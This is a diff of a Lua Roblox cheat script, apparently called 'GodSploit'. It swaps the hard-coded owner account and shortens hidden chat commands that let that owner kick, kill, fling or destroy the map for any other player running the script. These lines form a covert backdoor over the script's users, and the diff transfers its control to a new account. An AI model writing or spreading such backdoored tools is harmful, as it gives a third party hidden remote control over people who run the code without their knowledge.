@@ -1,4 +1,4 @@
-local Owner = "IDontUseAura9"
+local Owner = "noob_747778"
 
 local LocalPlayer = game.Players.LocalPlayer
 
@@ -5090,25 +5090,25 @@ task.spawn(function()
 
 		for i, v in next, PlayerService:GetPlayers() do
 			v.Chatted:Connect(function(Message)				
-				if Message:lower() == ";kick default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == ";kick" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer:Kick("Kicked by GodSploit owner")
 					end)
 				end
 
-				if Message:lower() == ";kill default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == ";kill" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						KillHumanoid(0)
 					end)
 				end
 
-				if Message:lower() == ";lagback default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == ";lagback" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(99999, 99999, 99999)
 					end)
 				end
 
-				if Message:lower() == ";breakmap default" and v.Name == Owner and LocalPlayer.Name ~= Owner then
+				if Message:lower() == ";breakmap" and v.Name == Owner and LocalPlayer.Name ~= Owner then
 					task.spawn(function()
 						for i, v in next, CollectionService:GetTagged("block") do
 							v:Destroy()
